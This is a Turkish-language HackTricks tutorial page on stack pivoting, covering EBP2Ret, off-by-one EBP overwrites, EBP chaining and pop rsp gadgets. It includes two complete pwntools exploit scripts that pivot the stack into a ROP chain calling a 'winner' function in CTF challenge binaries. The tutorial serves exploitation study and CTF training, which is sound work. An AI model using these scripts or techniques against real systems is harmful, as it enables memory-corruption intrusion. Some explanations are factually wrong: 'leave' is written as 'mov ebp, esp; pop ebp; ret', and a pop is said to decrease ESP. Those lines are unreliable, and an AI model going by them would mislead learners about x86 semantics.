# Yığın Pivotalama - EBP2Ret - EBP zincirleme

<details>

<summary><strong>Sıfırdan kahraman olmaya kadar AWS hackleme öğrenin</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Kırmızı Takım Uzmanı)</strong></a><strong>!</strong></summary>

HackTricks'ı desteklemenin diğer yolları:

* **Şirketinizi HackTricks'te reklamını görmek istiyorsanız** veya **HackTricks'i PDF olarak indirmek istiyorsanız** [**ABONELİK PLANLARI**](https://github.com/sponsors/carlospolop)'na göz atın!
* [**Resmi PEASS & HackTricks ürünleri**](https://peass.creator-spring.com)'ni edinin
* [**PEASS Ailesi'ni**](https://opensea.io/collection/the-peass-family) keşfedin, özel [**NFT'lerimiz**](https://opensea.io/collection/the-peass-family) koleksiyonumuz
* **Katılın** 💬 [**Discord grubuna**](https://discord.gg/hRep4RUj7f) veya [**telegram grubuna**](https://t.me/peass) veya bizi **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**'da takip edin.**
* **Hacking püf noktalarınızı paylaşarak PR göndererek** [**HackTricks**](https://github.com/carlospolop/hacktricks) ve [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github depolarına katkıda bulunun.

</details>

## Temel Bilgiler

Bu teknik, **Base Pointer (EBP)**'yi manipüle etme yeteneğini kullanarak EBP kaydının ve **`leave; ret`** komut dizisinin dikkatli kullanımıyla birden fazla işlevin yürütülmesini zincirleme şeklinde sömürür.

Hatırlatma olarak, **`leave`** temelde şunu ifade eder:
```
mov       ebp, esp
pop       ebp
ret
```
Ve **EBP, EIP'den önce stack'te** olduğundan, stack'i kontrol ederek EBP'yi kontrol etmek mümkündür.

### EBP2Ret

Bu teknik, **EBP kaydını değiştirebilirken EIP kaydını doğrudan değiştiremediğinizde** özellikle yararlıdır. Fonksiyonların çalışmayı bitirdiklerindeki davranışlarını kullanır.

`fvuln`'ün yürütülmesi sırasında, stack'e sahte bir EBP enjekte ederek, bu sahte EBP'nin ESP'nin işaret ettiği bellek alanına (pop işlemi için 4 bayt eklenerek) shellcode'unuzun adresinin bulunduğu bir yere işaret etmesini sağlarsanız, EIP'yi dolaylı olarak kontrol edebilirsiniz. `fvuln` geri döndüğünde, ESP bu hazırlanmış konuma ayarlanır ve ardışık pop işlemi ESP'yi 4 azaltarak, **efektif olarak saldırgan tarafından oraya depolanan bir adrese işaret etmesini sağlar.**\
Dikkat edin ki **2 adresi bilmelisiniz**: ESP'nin gideceği adres ve ESP'nin işaret ettiği adrese yazmanız gereken adres.

#### Saldırı Oluşturma

İlk olarak, **keyfi veri / adresler yazabileceğiniz bir adresi bilmelisiniz**. ESP buraya işaret edecek ve **ilk `ret`'yi çalıştıracak**.

Ardından, **keyfi kodu çalıştıracak `ret` tarafından kullanılan adresi** bilmelisiniz. Şunları kullanabilirsiniz:

* Geçerli bir [**ONE\_GADGET**](https://github.com/david942j/one\_gadget) adresi.
* **`system()`** adresi, **4 gereksiz bayt** ve `"/bin/sh"` adresi (x86 bit).
* Bir **`jump esp;`** cihazının ([**ret2esp**](../rop-return-oriented-programing/ret2esp-ret2reg.md)) adresi ve yürütülecek **shellcode** adresi.
* Bazı [**ROP**](../rop-return-oriented-programing/) zinciri

Kontrol edilen belleğin bu adreslerinden önce, `leave` talimatının `pop` kısmından dolayı **`4` bayt** olmalıdır. Bu 4B'yi kullanarak **ikinci sahte EBP**'yi ayarlamak ve yürütümü kontrol etmeye devam etmek mümkün olacaktır.

#### Off-By-One Saldırısı

Bu tekniğin belirli bir varyantı olan "Off-By-One Saldırısı" adı verilen özel bir varyantı vardır. Bu, yalnızca EBP'nin en az anlamlı baytını değiştirebileceğiniz durumlarda kullanılır. Bu durumda, **`ret` ile atlanacak adresi depolayan bellek konumu, EBP ile ilk üç baytı paylaşmalıdır**, daha kısıtlayıcı koşullarla benzer bir manipülasyon için izin verir.\
Genellikle mümkün olduğunca uzağa atlamak için bayt 0x00 değiştirilir.

Ayrıca, stack'te bir RET kaydırıcısı kullanmak ve gerçek ROP zincirini en sona koymak yaygındır, böylece yeni ESP'nin RET SLED içine işaret etme olasılığı daha yüksek olur ve son ROP zinciri yürütülür.

### **EBP Zincirleme**

Bu nedenle, stack'in `EBP` girişine kontrol edilen bir adres ve `EIP`'de `leave; ret` adresine yerleştirilen bir adresle, `ESP`'nin stack'teki kontrol edilen `EBP` adresine **taşınması mümkündür**.

Şimdi, **`ESP`** istenen bir adrese işaret ederek kontrol ediliyor ve yürütülecek sonraki talimat bir `RET`. Bunu kötüye kullanmak için, kontrol edilen ESP yerine şunları yerleştirmek mümkündür:

* **`(sonraki sahte EBP)`** -> `leave` talimatındaki `pop ebp` nedeniyle yeni EBP'yi yükleyin
* **`system()`** -> `ret` tarafından çağrılır
* **`(leave;ret)`** -> sistem bittiğinde çağrılır, ESP'yi sahte EBP'ye taşıyacak ve yeniden başlayacak
* **`("/bin/sh")`**-> `system` için parametre

Temelde programın akışını kontrol etmek için birkaç sahte EBP zincirlemek mümkündür.

Bu, bir [ret2lib](../rop-return-oriented-programing/ret2lib/) gibi, ancak görünür bir faydası olmayan daha karmaşık bir tekniktir, ancak bazı sınırlı durumlarda ilginç olabilir.

Ayrıca, burada bu tekniği bir **stack sızıntısı** ile kazanan bir işlevi çağırmak için kullanan bir [**meydan okuma örneği**](https://ir0nstone.gitbook.io/notes/types/stack/stack-pivoting/exploitation/leave) bulunmaktadır. Bu, sayfanın sonundaki final saldırı paylaşımıdır:
```python
from pwn import *

elf = context.binary = ELF('./vuln')
p = process()

p.recvuntil('to: ')
buffer = int(p.recvline(), 16)
log.success(f'Buffer: {hex(buffer)}')

LEAVE_RET = 0x40117c
POP_RDI = 0x40122b
POP_RSI_R15 = 0x401229

payload = flat(
0x0,               # rbp (could be the address of anoter fake RBP)
POP_RDI,
0xdeadbeef,
POP_RSI_R15,
0xdeadc0de,
0x0,
elf.sym['winner']
)

payload = payload.ljust(96, b'A')     # pad to 96 (just get to RBP)

payload += flat(
buffer,         # Load leak address in RBP
LEAVE_RET       # Use leave ro move RSP to the user ROP chain and ret to execute it
)

pause()
p.sendline(payload)
print(p.recvline())
```
## EBP kullanılmayabilir

[**Bu gönderide açıklandığı gibi**](https://github.com/florianhofhammer/stack-buffer-overflow-internship/blob/master/NOTES.md#off-by-one-1), bir ikili dosya bazı optimizasyonlarla derlenmişse, **EBP hiçbir zaman ESP'yi kontrol etmeyecek** şekilde derlenir, bu nedenle EBP'yi kontrol ederek çalışan herhangi bir saldırı temelde başarısız olacaktır çünkü gerçek bir etkisi olmayacaktır.\
Bu, ikili dosya optimize edilmişse **prolog ve epilog değişikliklerinin** olması nedeniyledir.

* **Optimize Edilmemiş:**
```bash
push   %ebp         # save ebp
mov    %esp,%ebp    # set new ebp
sub    $0x100,%esp  # increase stack size
.
.
.
leave               # restore ebp (leave == mov %ebp, %esp; pop %ebp)
ret                 # return
```
* **Optimize Edilmiş:**
```bash
push   %ebx         # save ebx
sub    $0x100,%esp  # increase stack size
.
.
.
add    $0x10c,%esp  # reduce stack size
pop    %ebx         # restore ebx
ret                 # return
```
## RSP'yi kontrol etmenin diğer yolları

### **`pop rsp`** cihazı

Bu teknik kullanılarak bir örnek bulabilirsiniz. Bu zorluk için belirli 2 argümanla bir işlevi çağırmak gerekiyordu ve bir **`pop rsp` cihazı** bulunmaktaydı ve bir **yığından sızıntı** vardı:
```python
# Code from https://ir0nstone.gitbook.io/notes/types/stack/stack-pivoting/exploitation/pop-rsp
# This version has added comments

from pwn import *

elf = context.binary = ELF('./vuln')
p = process()

p.recvuntil('to: ')
buffer = int(p.recvline(), 16) # Leak from the stack indicating where is the input of the user
log.success(f'Buffer: {hex(buffer)}')

POP_CHAIN = 0x401225       # pop all of: RSP, R13, R14, R15, ret
POP_RDI = 0x40122b
POP_RSI_R15 = 0x401229     # pop RSI and R15

# The payload starts
payload = flat(
0,                 # r13
0,                 # r14
0,                 # r15
POP_RDI,
0xdeadbeef,
POP_RSI_R15,
0xdeadc0de,
0x0,               # r15
elf.sym['winner']
)

payload = payload.ljust(104, b'A')     # pad to 104

# Start popping RSP, this moves the stack to the leaked address and
# continues the ROP chain in the prepared payload
payload += flat(
POP_CHAIN,
buffer             # rsp
)

pause()
p.sendline(payload)
print(p.recvline())
```
### xchg \<reg>, rsp cihazı
```
pop <reg>                <=== return pointer
<reg value>
xchg <reg>, rsp
```
### jmp esp

ret2esp tekniğini buradan kontrol edin:

{% content-ref url="../rop-return-oriented-programing/ret2esp-ret2reg.md" %}
[ret2esp-ret2reg.md](../rop-return-oriented-programing/ret2esp-ret2reg.md)
{% endcontent-ref %}

## Referanslar ve Diğer Örnekler

* [https://bananamafia.dev/post/binary-rop-stackpivot/](https://bananamafia.dev/post/binary-rop-stackpivot/)
* [https://ir0nstone.gitbook.io/notes/types/stack/stack-pivoting](https://ir0nstone.gitbook.io/notes/types/stack/stack-pivoting)
* [https://guyinatuxedo.github.io/17-stack\_pivot/dcquals19\_speedrun4/index.html](https://guyinatuxedo.github.io/17-stack\_pivot/dcquals19\_speedrun4/index.html)
* 64 bit, ret sled ile başlayan bir rop zinciri ile bir eksiklikten yararlanma
* [https://guyinatuxedo.github.io/17-stack\_pivot/insomnihack18\_onewrite/index.html](https://guyinatuxedo.github.io/17-stack\_pivot/insomnihack18\_onewrite/index.html)
* 64 bit, relro, canary, nx ve pie olmayan. Program, yığın veya pie için bir sızıntı sağlar ve bir qword'un WWW'sini verir. İlk olarak yığın sızıntısını alın ve WWW'yi geri gitmek için kullanın ve pie sızıntısını alın. Sonra WWW'yi kullanarak `.fini_array` girişlerini istismar eden ve `__libc_csu_fini`'yi çağıran bir sonsuz döngü oluşturun ([daha fazla bilgi için buraya bakın](../arbitrary-write-2-exec/www2exec-.dtors-and-.fini\_array.md)). Bu "sonsuz" yazma istismar edilerek, .bss'de bir ROP zinciri yazılır ve RBP ile dönerek onu çağırır.
